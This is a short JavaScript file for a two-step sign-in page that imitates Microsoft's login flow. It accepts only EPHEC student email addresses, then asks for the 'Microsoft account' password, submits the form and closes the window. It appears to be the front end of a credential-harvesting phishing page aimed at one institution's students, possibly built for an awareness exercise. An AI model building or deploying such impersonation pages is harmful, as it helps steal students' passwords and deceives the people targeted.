document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid EPHEC student email address.";
    const pwdReq = "Please enter the password for your Microsoft account.";
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = false;
    let pwdVal = false;

    const nxt = document.getElementById('btn_next');
    const sig = document.getElementById('btn_sig');

    nxt.addEventListener('click', (e) => {
        e.preventDefault();
        const uname = unameInp.value.trim();

        if (!uname || !uname.includes('@') || !uname.endsWith('@students.ephec.be')) {
            unameValAction(false);
            return;
        } else {
            unameValAction(true);
        }

        document.getElementById("section_uname").classList.add('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');
        document.querySelectorAll('#user_identity').forEach((e) => {
            e.innerText = uname;
        });
        view = "pwd";
    });

    sig.addEventListener('click', (e) => {
        
        const pwd = pwdInp.value.trim();

        if (pwd === '') {
            e.preventDefault();
            pwdValAction(false);

            return;
        } else {
            pwdValAction(true);
        }

        const form = sig.closest('form');
        if (form) form.submit();
    });

    function unameValAction(valid) {
        if (!valid) {
            document.getElementById('error_uname').innerText = unReq;
            unameInp.classList.add('error-inp');
            unameVal = false;
        } else {
            document.getElementById('error_uname').innerText = "";
            unameInp.classList.remove('error-inp');
            unameVal = true;
        }
    }

    function pwdValAction(valid) {
        if (!valid) {
            document.getElementById('error_pwd').innerText = pwdReq;
            pwdInp.classList.add('error-inp');
            pwdVal = false;
        } else {
            document.getElementById('error_pwd').innerText = "";
            pwdInp.classList.remove('error-inp');
            pwdVal = true;
        }
    }

    document.querySelector('.back').addEventListener('click', (e) => {
        e.preventDefault();
        view = "uname";
        document.getElementById("section_pwd").classList.add('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});
